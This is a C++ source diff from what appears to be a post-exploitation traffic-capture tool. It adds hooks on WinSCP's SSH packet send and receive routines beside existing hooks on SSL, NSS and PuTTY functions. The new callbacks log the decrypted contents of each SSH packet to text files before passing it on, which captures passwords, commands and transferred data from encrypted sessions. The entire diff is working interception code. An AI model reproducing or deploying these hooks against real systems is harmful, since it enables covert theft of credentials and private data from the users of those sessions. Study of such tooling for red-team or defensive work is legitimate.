@@ -14,6 +14,9 @@ SSL_Write_Typedef SSL_Write_Original;
 PR_Send_Typedef PR_Send_Original;
 PR_Recv_Typedef PR_Recv_Original;
 
+SSH_Pktsend_Typedef SSH_Pktsend_Original;
+SSH_Rdpkt_Typedef SSH_Rdpkt_Original;
+
 SslEncryptPacket_Typedef SslEncryptPacket_Original;
 SslDecryptPacket_Typedef SslDecryptPacket_Original;
 
@@ -420,4 +423,45 @@ int PuttyRecv_Callback(void *term, int is_stderr, const char *data, int len)
 	Hooker::RestoreHook((void *)PuttyRecv_Callback);
 
 	return ret;
+}
+
+// SSH_Pktsend - WinSCP send callback
+
+void SSH_Pktsend_Callback(void *ssh, Packet *pkt)
+{
+	// If allowed
+
+	if(FunctionFlow::CheckFlag() == FALSE)
+	{
+		if(pkt->data != NULL && pkt->length > 0) PluginSystem::ProcessAndSaveWrite("SSH_Pktsend.txt", (unsigned char *)pkt->data, pkt->length);
+	}
+
+	// Call original function
+	
+	SSH_Pktsend_Original(ssh, pkt);
+
+	FunctionFlow::UnCheckFlag();
+	Hooker::RestoreHook((void *)SSH_Pktsend_Callback);
+}
+
+// SSH_Rdpkt - WinSCP receive callback
+
+Packet* SSH_Rdpkt_Callback(void *ssh, unsigned char **data, int *datalen)
+{
+	Packet *pkt;
+
+	BOOL bFlag = FunctionFlow::CheckFlag();
+	pkt = SSH_Rdpkt_Original(ssh, data, datalen);
+
+	// Do things
+
+	if(bFlag == FALSE && pkt != NULL)
+	{
+		if(pkt->data != NULL && pkt->length > 0) PluginSystem::ProcessAndSaveRead("SSH_Rdpkt.txt", (unsigned char *)pkt->data, pkt->length);
+	}
+
+	FunctionFlow::UnCheckFlag();
+	Hooker::RestoreHook((void *)SSH_Rdpkt_Callback);
+
+	return pkt;
 }
